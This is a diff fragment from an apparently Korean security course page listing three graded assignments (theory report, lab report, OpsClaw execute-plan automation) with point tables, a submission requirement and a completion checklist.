+
+### 과제 1: 이론 정리 보고서 (30점)
+
+이번 주차의 핵심 개념을 자신의 말로 정리하라.
+
+| 항목 | 배점 |
+|------|------|
+| 핵심 개념 정의 및 설명 | 10점 |
+| 실습 결과 캡처 및 해석 | 10점 |
+| 보안 관점 분석 (공격↔방어) | 10점 |
+
+### 과제 2: 실습 수행 보고서 (40점)
+
+이번 주차의 모든 실습을 수행하고 결과를 보고서로 작성하라.
+
+| 항목 | 배점 |
+|------|------|
+| 실습 명령어 및 실행 결과 캡처 | 15점 |
+| 결과 해석 및 보안 의미 분석 | 15점 |
+| 트러블슈팅 경험 (있는 경우) | 10점 |
+
+### 과제 3: OpsClaw 자동화 (30점)
+
+이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화하라.
+
+| 항목 | 배점 |
+|------|------|
+| 프로젝트 생성 + stage 전환 | 5점 |
+| execute-plan 태스크 설계 (3개 이상) | 10점 |
+| evidence/summary 결과 | 5점 |
+| replay 타임라인 결과 | 5점 |
+| 자동화의 이점 분석 (직접 실행 대비) | 5점 |
+
+**제출:** 보고서(PDF 또는 MD) + OpsClaw project_id
+
+
+---
+
+## 검증 체크리스트
+
+이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:
+
+- [ ] 이론 강의 내용 이해 (핵심 용어 설명 가능)
+- [ ] 기본 실습 모두 수행 완료
+- [ ] 보충 실습 1 (기본 동작 확인) 완료
+- [ ] 보충 실습 2 (탐지/모니터링 관점) 수행
+- [ ] 보충 실습 3 (OpsClaw 자동화) 수행
+- [ ] 자가 점검 퀴즈 8/10 이상 정답
+- [ ] 과제 1 (이론 정리) 작성
+- [ ] 과제 2 (실습 보고서) 작성
+- [ ] 과제 3 (OpsClaw 자동화) 완료
+
